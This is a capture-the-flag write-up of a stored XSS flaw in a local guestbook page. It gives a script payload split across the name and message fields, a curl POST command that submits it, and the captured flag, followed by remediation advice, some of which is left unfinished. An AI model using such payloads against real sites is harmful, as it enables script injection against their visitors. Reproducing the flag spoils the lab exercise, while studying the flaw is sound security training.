# Cross-Site Scripting (XSS)

## Vulnerability Type

**OWASP A03:2021 - Injection** (CWE-79: Improper Neutralization of Input During Web Page Generation)

page: `http://localhost:8081/index.php?page=feedback`

Need to split the malicious payload between text fields:

```txt
<script>al → Fills the name input field.
ert('XSS')</script> → Fills the message text area.


## with curl
The -X flag specifies the HTTP request method (POST in this case).
When you use the -d flag, curl is smart enough to automatically change the method to POST. So the -X POST part is technically optional, but I will leave it in for readability
The -d flag stands for Data (specifically, HTTP POST data). -d glues all the inputs together into a single line using ampersands (&). curl formats the request as application/x-www-form-urlencoded by default.

```bash
curl -X POST "http://localhost:8081/index.php?page=feedback" \
     -d "txtName=%3Cscript%3Eal&mtxtMessage=ert%28%27XSS%27%29%3C%2Fscript%3E&btnSign=Sign+Guestbook" | grep flag
```

If we decode the -d string, it looks like this:

```txt
txtName=<script>al → Fills the name input field.

& → Separator.

mtxtMessage=ert('XSS')</script> → Fills the message text area.

& → Separator.

btnSign=Sign Guestbook → Simulates clicking the "Sign Guestbook" submit button.
```

When the server receives this, it glues txtName and mtxtMessage together on the page. Because we split the javascript `<script>alert('XSS')</script>` between the two fields, when the page renders them side-by-side, they combine into a single, malicious Cross-Site Scripting (XSS) payload.

## Details

This is a **Stored XSS** (also called Persistent XSS). There are 3 types:

| Type | How it works | Example |
|---|---|---|
| **Stored** (Persistent) | Payload is saved on the server (database). Every user who views the page gets hit. | Guestbook comment with `<script>` — this exploit ✅ |
| **Reflected** (Non-Persistent) | Payload is in the URL/request and immediately bounced back in the response. Only affects who clicks the link. | `search.php?q=<script>alert(1)</script>` |
| **DOM-based** | Payload never reaches the server. JavaScript on the page reads from the URL/DOM and unsafely inserts it. | `page.html#<img onerror=alert(1)>` |

This guestbook is **Stored XSS** because the `<script>` tag is saved in the database and rendered for every visitor who loads the page.

I entered a `<script>alert("XSS")</script` in the comment box and got the flag

The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e

## Key Failures

1. **No input sanitization** – User input (name and message) is stored as-is in the database
2. **No output encoding** – Comments are rendered directly in HTML without escaping
3. **No Content Security Policy** – No CSP header to restrict script execution
4. **Stored in database** – Makes it persistent; every user is affected
5. **No HTML/script filtering** – Application doesn't strip or validate HTML tags

## Remediation

1. **Output encoding** – Always HTML-encode user input before rendering:
This converts `<script>` to `&lt;script&gt;` so browsers render it as text, not code.

2. **Input validation** – Whitelist allowed characters (alphanumeric, spaces, basic punctuation):

3. **Content Security Policy (CSP)** – Add HTTP header to block inline scripts:

4. **Use templating engines** – Modern frameworks (Twig, Vue, React) auto-escape by default

5. **Filter on input, encode on output** – Accept any input, but sanitize when rendering

6. **Regular security testing** – Scan for XSS payloads:
